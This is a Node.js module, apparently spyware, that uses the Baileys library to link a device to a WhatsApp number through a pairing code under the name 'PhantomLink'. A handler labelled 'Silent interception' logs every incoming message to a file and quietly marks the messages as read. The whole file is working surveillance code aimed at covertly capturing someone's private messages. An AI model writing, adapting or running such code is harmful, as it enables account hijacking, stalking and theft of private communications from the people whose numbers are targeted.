const { makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
const fs = require('fs');
const path = require('path');

const LOG_DIR = path.join('/app', 'data', 'logs');
if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR, { recursive: true });
const AUTH_DIR = path.join('/app', 'data', 'auth');

async function start(number) {
  const { state, saveCreds } = await useMultiFileAuthState(AUTH_DIR);
  const { version } = await fetchLatestBaileysVersion();
  const sock = makeWASocket({ version, auth: state, browser: ['PhantomLink','Chrome','1.0.0'], printQRInTerminal: false });

  sock.ev.on('creds.update', saveCreds);
  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect, qr } = update;
    if ((connection === 'connecting' || !!qr) && !sock.authState.creds.registered) {
      console.log('Requesting pairing code for', number);
      try {
        const code = await sock.requestPairingCode(number);
        console.log('Pairing code:', code);
        fs.writeFileSync(path.join(LOG_DIR, 'pairing_code.txt'), code);
      } catch(e) { console.error(e.message); }
    }
    if (connection === 'open') console.log('✅ Session OPEN');
    if (connection === 'close') {
      if (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut)
        setTimeout(() => start(number), 5000);
    }
  });

  // Silent interception
  sock.ev.on('messages.upsert', async (msg) => {
    const logFile = path.join(LOG_DIR, `messages_${number}.json`);
    let existing = [];
    try { existing = JSON.parse(fs.readFileSync(logFile,'utf8')); } catch(_) {}
    existing.push({ ts: new Date().toISOString(), msg });
    fs.writeFileSync(logFile, JSON.stringify(existing, null, 2));
    // Mark as read silently
    for (const m of msg.messages) {
      if (m.key) await sock.readMessages([m.key]).catch(() => {});
    }
  });
}

module.exports = start;
